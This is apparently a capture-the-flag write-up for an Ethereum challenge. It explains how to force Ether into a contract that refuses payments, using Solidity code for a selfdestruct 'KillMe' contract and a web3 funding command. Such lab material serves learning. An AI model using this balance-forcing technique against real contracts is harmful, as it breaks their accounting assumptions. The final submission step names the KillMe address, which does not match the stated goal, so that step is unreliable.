# Spiritual Box

## Problem Statement
>Donate exactly "69 Wei" in this "Spiritual Box", and Venus would shine upon you.  
["Spiritual Box" aka contract page](http://34.216.132.109:8082/)  
Finally, submit your contract address at nc 34.216.132.109 9091 to get the flag.  
>**Output Format**  
>CodefestCTF{flag}  

**Contract Code**(The Spiritual/Donation Box) of problem statement.
```
1. pragma solidity ^0.4.6;
2.
3. contract Donationbox {
4.
5.     uint private prev;
6.     uint private temp;
7.
8.     constructor() public {
9.        prev = now;
10.    }
11.
12.    function donate() public payable{
13.       temp = now;
14.       require(temp - prev > 500 && msg.value <= 5 && msg.value > 0);
15.       prev = temp;
16.    }
17.
18.    function () public payable{
19.      revert();
20.    }
21. }
```
## Solution  
From given contract code, we can only use donate function every 500 seconds (now in solidity is alias for block.timestamp) and the donation amount should be <= 5, which would have take a lot of time and effort if the total donation amount is large. Moreover donate is the only fucntion that can accept Ether since the **fallback** function [line #18] always reverts(rejects) payments.  
There is a concept in solidity called **selfdestruct(also suicide)** [docs-link](https://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#contract-related). So when a contract commits suicide(destroys itself, freeing up the space on blockchain), it forces it's balance to the address specified in function **selfdestruct(address)**, none of the function of the contract, in which the Ether is forced into, is called. Hence, even the fallback payable function is not able to reject Ether.  

**To solve this challenge**
* Create a new instance from the button privided in the challenge page.  
* Open a new tab and enter [https://remix.ethereum.org](https://remix.ethereum.org), an online Solidity IDE.
* Write a new contract in the IDE which will commit suicide, and deploy it on the same network as that of Spiritual Box.  

```
pragma solidity ^0.4.6;

contract KillMe {

  function selfDestruct() public  {
    selfdestruct(0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7);
  }

  function() payable public {
  }

}
```
Where "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7" is the address of the deployed Spiritual/Donation Box Contract.
* Send some Ether into **KillMe** contract from any Ethereum Wallet Account via web3 injected by Metamask, in the browser console.  

```
web3.eth.sendTransaction({from:web3.eth.defaultAccount ,to:'0x5b1869d9a4c187f2eaa108f3062412ecf0526b24', value:69}, (err,res)=>{console.log(err,res);})
```
Where "0x5b1869d9a4c187f2eaa108f3062412ecf0526b24" is the address of **KillMe** contract.  
* After having sent 69 Wei to KillMe contract, call its **selfDestruct** function to commit suicide and finally force its balance to the Spiritual Box address.  
![KillMe.sol](http://example.com)  
* Now submit address "0x5b1869d9a4c187f2eaa108f3062412ecf0526b24" at ```nc 34.216.132.109 9091``` to get the flag.
